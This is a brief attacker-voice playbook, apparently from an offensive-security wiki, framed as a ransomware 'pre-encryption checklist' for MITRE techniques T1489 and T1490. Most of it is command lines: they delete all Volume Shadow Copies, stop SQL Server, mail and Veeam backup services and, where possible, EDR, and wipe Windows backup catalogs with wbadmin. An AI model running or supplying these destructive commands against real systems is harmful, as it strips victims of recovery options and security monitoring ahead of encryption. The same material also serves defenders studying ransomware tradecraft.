---
title: Service Stop and Inhibit Recovery
tags: [impact, ransomware, shadow-copies, service-stop]
description: Disabling security tools and preventing data recovery to maximize impact.
date: 2024-01-02
---

# Service Stop (T1489) / Inhibit System Recovery (T1490)

The Pre-Encryption Checklist.

## 1. Delete Shadow Copies
Windows Volume Shadow Copies allow users to "Restore Previous Versions". We must kill this.
```bash
vssadmin.exe Delete Shadows /All /Quiet
wmic shadowcopy delete
```
*Note*: This command is heavily monitored by EDR.

## 2. Stop Services
We can't encrypt a file if it is "Open" by a service (File Lock).
- **Target**: Database services, Mail servers, Backup agents.
  ```bash
  net stop "SQL Server (MSSQLSERVER)"
  net stop "Veeam Backup Service"
  ```
- **Security**: Stopping EDR services (if possible).

## 3. Delete Backup Catalogs
wbadmin is the Windows Backup tool.
```bash
wbadmin DELETE SYSTEMSTATEBACKUP
wbadmin DELETE BACKUP -keepVersions:0
```
